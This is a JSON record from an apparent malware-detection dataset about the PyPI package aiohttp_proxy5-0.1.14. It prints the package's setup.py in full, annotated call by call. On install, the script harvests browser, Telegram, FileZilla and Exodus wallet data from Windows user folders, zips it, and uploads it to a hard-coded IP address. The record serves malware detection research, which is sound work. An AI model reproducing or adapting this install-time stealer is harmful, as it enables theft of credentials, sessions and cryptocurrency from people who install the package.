{
  "metadata": {
    "package_name": "aiohttp_proxy5-0.1.14",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/aiohttp_proxy5-0.1.14.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/aiohttp_proxy5-0.1.14.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport sys\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    os.system('pip install aiofiles')\n    os.system('pip install aiohttp')\n    os.system('pip install cryptography')\n    os.system('pip install aiosqlite')\n    import contextlib as __stickytape_contextlib\n\n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n\n            make_package(os.path.dirname(path))\n\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n\n        __stickytape_write_module('path_search.py', b\"import asyncio\\r\\nimport os\\r\\nfrom os.path import join, isdir\\r\\nfrom typing import Dict, Iterable, List\\r\\n\\r\\n\\r\\nLOCAL = os.environ['USERPROFILE']\\r\\n\\r\\nroot_paths = {\\r\\n    join(LOCAL, 'appdata'),\\r\\n    join(LOCAL, 'appdata', 'local'),\\r\\n    join(LOCAL, 'appdata', 'roaming'),\\r\\n    join(LOCAL, 'documents'),\\r\\n    join(LOCAL, 'downloads'),\\r\\n    join(LOCAL, 'desktop'),\\r\\n    'C:\\\\',\\r\\n    'D:\\\\',\\r\\n    'E:\\\\',\\r\\n    'C:\\\\Program Files',\\r\\n    'C:\\\\Program Files (x86)',\\r\\n    'C:\\\\\\\\ProgramData'\\r\\n\\r\\n}\\r\\n\\r\\n\\r\\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\\r\\n    tasks: List[asyncio.Task] = []\\r\\n\\r\\n    queries = {k.lower(): v for k,v in queries.items()}\\r\\n    target_folder_names = set(queries.keys())\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if queries[fname] is not None:\\r\\n                    curr_path = join(p, fname)\\r\\n                    loop = asyncio.get_event_loop()\\r\\n                    task = loop.create_task(queries[fname].callback(curr_path))\\r\\n                    tasks.append(task)\\r\\n\\r\\n    for task in tasks:\\r\\n        await task\\r\\n\\r\\n\\r\\nasync def search_paths(paths: Iterable[str], queries: Iterable):\\r\\n    target_folder_names = {i.lower() for i in queries}\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if fname in target_folder_names:\\r\\n                    yield join(p, fname)\\r\\n\")\n        # ... (many __stickytape_write_module calls omitted for brevity)\n        import asyncio\n        from asyncio import create_task\n        from weakref import proxy\n        from path_search import search_plugin_paths, root_paths\n        from config import Config\n        from aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData\n        import secrets\n        import timeit\n        from paths import TEMP\n        from os import mkdir\n        from os.path import join\n        from zipfile import ZipFile, ZIP_DEFLATED\n        from base64 import b64encode\n        from tools import zipdir\n        \n        from plugins import Chromium, Details, Exodus, Filezilla, Telegram\n        \n        \n        \n        HOST = 'http://144.24.115.170'\n        \n        \n        async def main() -> None:\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n        \n            print(log_path)\n            mkdir(log_path)\n        \n            tasks = []\n        \n            conf = Config(client_id=client_id, host=HOST, log_path=log_path)\n            \n            chromium = Chromium(conf)\n        \n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'yandex': chromium,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            \n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n        \n            other_plugins = [Details(conf)]\n        \n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n        \n            for task in tasks:\n                await task\n            \n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n        \n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            \n                async with Session() as s:\n                    await s.post(f'{HOST}/receive_log', data=writer, params={'client_id': client_id})\n        \n        asyncio.run(main())",
          "triple_sequences": [
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install aiofiles",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install aiohttp",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install cryptography",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install aiosqlite",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "tempfile.mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "dir_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "partial_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "partial_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "os.path.join(partial_path, \"__init__.py\")",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "b\"\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.dirname()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "path",
              "object_description": "Path segment",
              "object_id": "path_segment",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "(__stickytape_working_dir, path)",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "full_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "module_file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "contents",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "sys.path.insert()",
              "action_description": "Path object and status operations (creating Path objects, retrieving file status)",
              "action_id": "path_object_operations",
              "object": "__stickytape_working_dir",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "print()",
              "action_description": "Retrieves standard output stream object",
              "action_id": "get_stdout_stream",
              "object": "log_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Collect current working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "log_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "create_task()",
              "action_description": "Creates asynchronous task",
              "action_id": "create_async_task",
              "object": "search_plugin_paths(root_paths, search_folder_names)",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "create_task()",
              "action_description": "Creates asynchronous task",
              "action_id": "create_async_task",
              "object": "plugin.callback()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "await task",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "task",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "zip_log_path, 'w', ZIP_DEFLATED",
              "object_description": "ZIP archive",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "zipdir()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "log_path, zipf",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "MultipartWriter()",
              "action_description": "Creates multipart writer for HTTP requests",
              "action_id": "create_multipart_writer",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "writer.append()",
              "action_description": "Adds field to multipart HTTP request",
              "action_id": "add_multipart_field",
              "object": "open(zip_log_path, 'rb')",
              "object_description": "ZIP archive",
              "object_id": "zip_archive",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "Session()",
              "action_description": "Creates HTTP session for making asynchronous requests",
              "action_id": "create_http_session",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "s.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'{HOST}/receive_log', data=writer, params={'client_id': client_id}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "main()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}